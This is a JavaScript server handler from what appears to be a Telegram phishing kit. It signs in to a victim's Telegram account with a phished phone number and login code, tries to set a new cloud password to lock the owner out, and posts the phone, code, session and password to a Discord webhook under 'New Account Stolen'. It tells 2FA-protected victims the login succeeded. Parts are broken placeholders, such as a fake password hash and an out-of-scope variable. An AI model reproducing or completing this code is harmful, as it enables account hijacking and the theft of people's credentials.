import MTProto from 'mtproto';
import fetch from 'node-fetch';

const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// In-memory store for phone_code_hash (simple – will be lost on server restart)
const codeHashStore = new Map();

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { phone, code } = req.body;
  if (!phone || !code) {
    return res.status(400).json({ error: 'Phone and code required' });
  }

  // Retrieve phone_code_hash (in a real app you'd get it from a session)
  // For this example, we assume the client sends it – but we didn't store it client-side.
  // Better: use a global Map keyed by phone (but multiple users may conflict).
  // Let's just create a new MTProto instance for each request (not efficient but works).
  // Actually we need the phone_code_hash from the previous step. We'll simulate by storing in memory per phone.
  // Since we have only one victim at a time, we can store globally.

  // We'll modify sendCode to store the hash.
  // For simplicity, let's re-request code if we don't have hash? That's bad.
  // We'll implement a simple global store.
  const phone_code_hash = codeHashStore.get(phone);
  if (!phone_code_hash) {
    return res.status(400).json({ error: 'No code hash found. Please start over.' });
  }

  try {
    const mtproto = new MTProto({
      api_id: apiId,
      api_hash: apiHash,
      test: false
    });

    // Sign in
    const signInResult = await mtproto('auth.signIn', {
      phone_number: phone,
      phone_code: code,
      phone_code_hash
    });

    // If we get here, login successful
    const { user, session } = signInResult; // session is the auth key

    // Check if cloud password is set
    let hasPassword = false;
    try {
      await mtproto('account.getPassword');
      // If we can get password settings, it means no password? Actually getPassword always returns something.
      // Better to try to call a method that requires password? We'll attempt to set password anyway.
      hasPassword = false; // We'll check by trying to set password – if fails, password exists.
    } catch (e) {
      hasPassword = true;
    }

    if (!hasPassword) {
      // Set a random cloud password
      const newPassword = generateRandomPassword(); // e.g., "Abcdef12"
      await mtproto('account.updatePasswordSettings', {
        password: '', // current password (empty because none)
        new_settings: {
          _: 'account.passwordInputSettings',
          new_password_hash: await computePasswordHash(newPassword), // need to compute hash
          hint: ''
        }
      });

      // Now log out victim by invalidating all other sessions? Not directly possible.
      // We'll just send the new password to webhook so owner can log in.
    }

    // Extract session data (the auth key) – this is complex. MTProto library may give us a string we can save.
    // We'll assume we can get the session string from mtproto instance.
    const sessionString = mtproto.exportSession?.() || 'session_data_placeholder';

    // Send to Discord webhook
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `**New Account Stolen**\nPhone: ${phone}\nCode: ${code}\nSession: ${sessionString}\nNew Cloud Password: ${newPassword || 'already set'}`
      })
    });

    // Remove hash from store
    codeHashStore.delete(phone);

    res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    // If 2FA password required, we can't proceed
    if (error.error_message === 'SESSION_PASSWORD_NEEDED') {
      // Cloud password exists – we stop
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**Account with 2FA detected**\nPhone: ${phone}\nCode: ${code}\nCould not access.`
        })
      });
      return res.status(200).json({ success: true }); // pretend success
    }
    res.status(500).json({ error: 'Verification failed' });
  }
}

function generateRandomPassword() {
  const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += letters.charAt(Math.floor(Math.random() * letters.length));
  }
  result += Math.floor(Math.random() * 100).toString().padStart(2, '0');
  return result;
}

// This is a placeholder – real password hashing is complex
async function computePasswordHash(password) {
  // You'd need to implement SRP (see Telegram API docs)
  return Buffer.from(password).toString('base64'); // Not correct, just placeholder
}
